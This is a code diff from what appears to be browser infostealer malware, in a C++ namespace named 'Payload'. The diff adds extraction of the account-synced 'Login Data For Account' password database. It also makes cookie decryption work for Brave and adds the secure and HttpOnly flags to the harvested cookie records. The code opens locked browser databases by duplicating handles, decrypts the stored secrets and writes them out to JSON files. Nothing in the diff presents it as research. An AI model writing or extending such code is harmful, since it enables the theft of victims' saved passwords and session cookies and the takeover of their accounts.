@@ -96,11 +96,22 @@ namespace Payload {
         } catch(...) {}
 
         try {
-            // Passwords
+            // Passwords (local)
             auto loginPath = profilePath / "Login Data";
             if (std::filesystem::exists(loginPath)) {
                 if (auto db = OpenDatabaseWithHandleDuplication(loginPath)) {
                     ExtractPasswords(db, m_outputBase / browserName / profilePath.filename() / "passwords.json");
+                    sqlite3_close(db);
+                }
+            }
+        } catch(...) {}
+
+        try {
+            // Passwords (account-synced)
+            auto loginAccountPath = profilePath / "Login Data For Account";
+            if (std::filesystem::exists(loginAccountPath)) {
+                if (auto db = OpenDatabaseWithHandleDuplication(loginAccountPath)) {
+                    ExtractPasswords(db, m_outputBase / browserName / profilePath.filename() / "passwords_account.json");
                     sqlite3_close(db);
                 }
             }
@@ -139,13 +150,21 @@ namespace Payload {
                 std::vector<uint8_t> encrypted((uint8_t*)blob, (uint8_t*)blob + blobLen);
                 auto decrypted = Crypto::AesGcm::Decrypt(m_key, encrypted);
                 
-                if (decrypted && decrypted->size() > 32) {
-                    std::string val((char*)decrypted->data() + 32, decrypted->size() - 32);
-                    
+                if (decrypted && !decrypted->empty()) {
+                    // Chrome cookies have a 32-byte header after decryption; Brave may not
+                    std::string val;
+                    if (decrypted->size() > 32) {
+                        val = std::string((char*)decrypted->data() + 32, decrypted->size() - 32);
+                    } else {
+                        val = std::string((char*)decrypted->data(), decrypted->size());
+                    }
+
                     std::stringstream ss;
                     ss << "{\"host\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 0)) << "\","
                        << "\"name\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
                        << "\"path\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 2)) << "\","
+                       << "\"is_secure\":" << (sqlite3_column_int(stmt, 3) ? "true" : "false") << ","
+                       << "\"is_httponly\":" << (sqlite3_column_int(stmt, 4) ? "true" : "false") << ","
                        << "\"expires\":" << sqlite3_column_int64(stmt, 5) << ","
                        << "\"value\":\"" << EscapeJson(val) << "\"}";
                     entries.push_back(ss.str());
